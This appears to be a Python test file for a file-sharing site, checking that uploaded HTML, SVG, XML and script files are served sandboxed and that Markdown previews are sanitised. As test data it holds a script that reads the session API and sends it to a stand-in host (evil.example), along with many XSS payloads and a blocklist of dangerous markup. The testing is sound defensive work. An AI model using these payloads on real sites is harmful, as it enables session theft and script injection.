"""Rule 5, inline answers: a file served inline from the site's own origin must not run script there.
Uploaded .html, .svg, .xml, .js (and their relatives) through /pd/ inline, the previews and shares: the
type, nosniff, Content-Disposition and the sandbox CSP, whatever else the site adds to its pages' policy;
and the HTML the Markdown preview and the readmes hand to the page."""

from __future__ import annotations

import os
import unittest
from unittest import mock

from apps.files import download
from apps.storages.models import ReadmeRule

from .base import FOLDER, CrossCase, query_of

SCRIPT = b"<script>fetch('/api/v1/session/').then(r=>r.text()).then(t=>location='https://evil.example/?'+t)</script>"
FILES = {
    "evil.html": b"<!doctype html><html><body>" + SCRIPT + b"</body></html>",
    "evil.htm": b"<html>" + SCRIPT + b"</html>",
    "evil.xhtml": b"<html xmlns='http://www.w3.org/1999/xhtml'><body>" + SCRIPT + b"</body></html>",
    "evil.svg": b"<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'>" + SCRIPT + b"</svg>",
    "evil.xml": b"<?xml version='1.0'?><html xmlns='http://www.w3.org/1999/xhtml'>" + SCRIPT + b"</html>",
    "evil.xsl": b"<?xml version='1.0'?><xsl:stylesheet version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform'/>",
    "evil.js": b"alert(document.cookie)",
    "evil.mjs": b"alert(document.cookie)",
    "evil.css": b"body{background:url(https://evil.example/)}",
    "evil.wasm": b"\x00asm\x01\x00\x00\x00",
    "noext": b"<html>" + SCRIPT + b"</html>",
    "evil.txt": b"<html>" + SCRIPT + b"</html>",
}
# What each is sent as: never a type a browser runs or applies (scripts, style sheets, wasm).
TYPES = {
    "evil.html": "text/html", "evil.htm": "text/html", "evil.xhtml": "application/xhtml+xml",
    "evil.svg": "image/svg+xml", "evil.xml": "application/xml", "evil.xsl": "application/xslt+xml",
    "evil.js": "text/plain", "evil.mjs": "text/plain", "evil.css": "text/plain", "evil.wasm": "text/plain",
    "noext": "application/octet-stream", "evil.txt": "text/plain",
}


class InlineCase(CrossCase):
    def setUp(self):
        super().setUp()
        for name, data in FILES.items():
            self.assertOk(self.upload(self.as_alice, "/docs", name, data), 201, name)
        self.share = self.share_of(self.alice, "/", [("docs", FOLDER)])

    def assertSandboxed(self, response, name, *, inline=True, msg=""):
        """The answer of a stored file: its type, nosniff, the disposition and a sandbox that lets
        nothing run (no allow-scripts, no allow-same-origin)."""
        label = f"{name} {msg}"
        self.assertIn(response.status_code, (200, 206), label)
        ctype = response["Content-Type"].split(";")[0].strip()
        self.assertEqual(ctype, TYPES[name], label)
        self.assertEqual(response["X-Content-Type-Options"], "nosniff", label)
        disposition = response["Content-Disposition"]
        self.assertTrue(disposition.startswith("inline" if inline else "attachment"), f"{label}: {disposition}")
        csp = response["Content-Security-Policy"]
        self.assertEqual(csp, download.SANDBOX, label)
        self.assertNotIn("allow-", csp, label)
        self.assertIn("default-src 'none'", csp, label)
        self.assertNotIn("Content-Security-Policy-Report-Only", response.headers, label)


class PdInlineTests(InlineCase):
    def test_the_item_endpoints_inline_url(self):
        for name in FILES:
            with self.subTest(name=name):
                url = self.inline_url(self.as_alice, f"/docs/{name}")
                self.assertEqual(query_of(url)["d"], ["i"])
                response, body = self.fetch(self.anon, url)
                self.assertSandboxed(response, name)
                self.assertEqual(body, FILES[name])

    def test_ranges_and_head(self):
        for name in ("evil.html", "evil.svg", "evil.js"):
            with self.subTest(name=name):
                url = self.inline_url(self.as_alice, f"/docs/{name}")
                response, body = self.fetch(self.anon, url, HTTP_RANGE="bytes=0-9")
                self.assertEqual(response.status_code, 206)
                self.assertSandboxed(response, name, msg="206")
                head = self.anon.head(url)
                self.assertSandboxed(head, name, msg="HEAD")
                unsatisfiable = self.anon.get(url, HTTP_RANGE="bytes=99999-")
                self.assertEqual(unsatisfiable.status_code, 416)
                self.assertEqual(unsatisfiable["Content-Security-Policy"], download.SANDBOX)
                self.assertEqual(unsatisfiable["X-Content-Type-Options"], "nosniff")

    def test_listing_links_when_downloads_arent_forced(self):
        """下载链接强制下载 off: the listing's own links are inline too; the sandbox holds."""
        self.storage.force_download = False
        self.storage.save()
        for name in ("evil.html", "evil.svg", "evil.xml"):
            with self.subTest(name=name):
                url = self.file_url(self.as_alice, f"/docs/{name}")
                self.assertNotIn("d", query_of(url))
                self.assertSandboxed(self.fetch(self.anon, url)[0], name)

    def test_downloads(self):
        for name in ("evil.html", "evil.svg"):
            with self.subTest(name=name):
                url = self.file_url(self.as_alice, f"/docs/{name}")
                self.assertSandboxed(self.fetch(self.anon, url)[0], name, inline=False)

    def test_a_policy_the_pages_widen(self):
        """Custom JS (D33), a linked logo and single sign-on icons widen the pages' CSP; a stored file's
        answer keeps its own sandbox."""
        self.site(custom_js="console.log(1)", home_logo="https://cdn.example.com/logo.png")
        with mock.patch("apps.sso.icons.origins", return_value=["https://icons.example.com"]):
            for name in ("evil.html", "evil.xhtml", "evil.svg"):
                with self.subTest(name=name):
                    url = self.inline_url(self.as_alice, f"/docs/{name}")
                    self.assertSandboxed(self.fetch(self.anon, url)[0], name)
            page = self.as_alice.get("/disk/docs")
            self.assertIn("https:", page["Content-Security-Policy"])  # the page itself did get wider

    def test_a_pdf_named_file_isnt_html(self):
        """PDFs go without the sandbox (viewers don't run in one): a .pdf is application/pdf with nosniff,
        whatever is in it."""
        self.assertOk(self.upload(self.as_alice, "/docs", "evil.pdf", FILES["evil.html"]), 201)
        url = self.inline_url(self.as_alice, "/docs/evil.pdf")
        response = self.fetch(self.anon, url)[0]
        self.assertEqual(response["Content-Type"], "application/pdf")
        self.assertEqual(response["X-Content-Type-Options"], "nosniff")
        self.assertEqual(response["Content-Security-Policy"], download.PDF_POLICY)

    def test_a_name_the_signature_holds(self):
        """The name that picks the type is the path's (or a signed n=): it can't be switched to .html."""
        url = self.inline_url(self.as_alice, "/docs/evil.txt")
        self.assertEqual(self.anon.get(url.replace("&sign=", "&n=x.html&sign=")).status_code, 403)
        self.assertEqual(self.anon.get(url.replace("evil.txt", "evil.html")).status_code, 403)


class ShareInlineTests(InlineCase):
    def test_previews(self):
        for name in FILES:
            with self.subTest(name=name):
                for headers in ({}, {"HTTP_SEC_FETCH_DEST": "empty"}, {"HTTP_SEC_FETCH_DEST": "document"}):
                    response = self.vpreview(self.anon, self.share, f"/docs/{name}", **headers)
                    self.assertEqual(response.status_code, 302)
                    self.assertTrue(response["Location"].startswith("/pd/disk/docs/"), response["Location"])
                    served, body = self.served(self.anon, response)
                    self.assertSandboxed(served, name, msg=str(headers))
                    self.assertEqual(body, FILES[name])

    def test_the_viewers_inline_url(self):
        for name in FILES:
            with self.subTest(name=name):
                item = self.assertOk(self.vitem(self.anon, self.share, f"/docs/{name}")).json()
                self.assertSandboxed(self.fetch(self.anon, item["inline_url"])[0], name)

    def test_downloads(self):
        for name in ("evil.html", "evil.svg", "evil.js"):
            with self.subTest(name=name):
                served, _ = self.served(self.anon, self.vdownload(self.anon, self.share, f"/docs/{name}"))
                self.assertSandboxed(served, name, inline=False)


class LinkInlineTests(InlineCase):
    def test_path_and_short_links(self):
        for name in ("evil.html", "evil.svg", "evil.xml"):
            with self.subTest(name=name):
                for link in (self.path_link(self.as_alice, f"/docs/{name}"), self.short_link(self.as_alice, f"/docs/{name}")):
                    response, target, body = self.follow(self.anon if link.startswith("/s/") else self.as_alice, link)
                    self.assertEqual(response.status_code, 302)
                    self.assertSandboxed(target, name, inline=False)

    def test_a_playlist_answered_by_the_site(self):
        """An .m3u8 is read and answered by the link itself (apps/links/delivery.py): whatever it holds, it is
        a playlist, an attachment, sandboxed."""
        self.assertOk(self.upload(self.as_alice, "/docs", "evil.m3u8", FILES["evil.html"]), 201)
        for link in (self.path_link(self.as_alice, "/docs/evil.m3u8"), self.short_link(self.as_alice, "/docs/evil.m3u8")):
            with self.subTest(link=link):
                response = self.as_alice.get(link)
                self.assertEqual(response.status_code, 200)
                self.assertEqual(response["Content-Type"], "application/vnd.apple.mpegurl; charset=utf-8")
                self.assertEqual(response["X-Content-Type-Options"], "nosniff")
                self.assertTrue(response["Content-Disposition"].startswith("attachment"))
                self.assertEqual(response["Content-Security-Policy"], download.SANDBOX)


class RenderedHtmlTests(CrossCase):
    """HTML the site renders from stored text (apps.core.markdown.render, untrusted) for the page to insert."""

    NASTY = "\n\n".join([
        "# title",
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)><script>alert(2)</script></svg>",
        "<iframe src='https://evil.example'></iframe>",
        "<object data='x.swf'></object><embed src='x.swf'>",
        "<form action='https://evil.example'><input name=password></form>",
        "<style>body{display:none}</style>",
        "<base href='https://evil.example/'>",
        "<meta http-equiv='refresh' content='0;url=https://evil.example'>",
        "<a href='javascript:alert(1)'>a</a> [b](javascript:alert(1)) [c](JaVaScRiPt:alert(1))",
        "<a href='vbscript:x'>v</a> <a href='data:text/html,<script>alert(1)</script>'>d</a>",
        "![x](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+)",
        "<img srcset='javascript:alert(1) 1x'>",
        "<div id='files' class='dialog' style='position:fixed' data-open='login'>x</div>",
        "<a href='#' onclick='alert(1)'>c</a>",
    ])

    def assertClean(self, html):
        lowered = html.lower()
        for bad in ("<script", "onerror", "onload", "onclick", "<iframe", "<object", "<embed", "<form", "<style",
                    "<base", "<meta", "javascript:", "vbscript:", "data:text/html", "data:image/svg", "style=",
                    "data-open", "id=", "class="):
            self.assertNotIn(bad, lowered, html)

    def test_the_markdown_preview(self):
        self.assertOk(self.upload(self.as_alice, "/docs", "nasty.md", self.NASTY.encode()), 201)
        url = self.inline_url(self.as_alice, "/docs/nasty.md")
        html = self.assertOk(self.preview_markdown(self.anon, url)).json()["html"]
        self.assertIn("<h1>title</h1>", html)
        self.assertClean(html)

    def test_a_folders_readme_file(self):
        self.storage.readme_from_file = True
        self.storage.save()
        self.assertOk(self.upload(self.as_alice, "/docs", "README.md", self.NASTY.encode()), 201)
        readme = self.assertOk(self.list_(self.as_alice, "/docs")).json()["readme"]
        self.assertIn("<h1>title</h1>", readme["html"])
        self.assertClean(readme["html"])

    def test_a_readme_rule(self):
        """Readme rules are typed by staff who aren't superusers: untrusted too (D33 refined)."""
        ReadmeRule.objects.create(storage=self.storage, expression="/docs", text=self.NASTY)
        readme = self.assertOk(self.list_(self.as_alice, "/docs")).json()["readme"]
        self.assertIn("<h1>title</h1>", readme["html"])
        self.assertClean(readme["html"])

    @unittest.skipIf(os.name == "nt", "Windows has no names with < > \" in them")
    def test_the_share_and_browser_pages_escape_their_config(self):
        """A name with markup goes into the pages' data-config attribute escaped."""
        import urllib.parse

        name = "\"><img src=x onerror=alert(1)>"
        self.files({f"docs/{name}/x.txt": b"x"})
        share = self.share_of(self.alice, "/docs", [(name, FOLDER)])
        quoted = urllib.parse.quote(name)
        for page in (self.as_alice.get(f"/disk/docs/{quoted}"), self.anon.get(f"/share/{share.key}?path=/{quoted}")):
            with self.subTest(page=page):
                self.assertEqual(page.status_code, 200)
                self.assertNotIn(b"<img src=x onerror", page.content)
                self.assertIn(b"&quot;&gt;&lt;img src=x onerror=alert(1)&gt;", page.content)
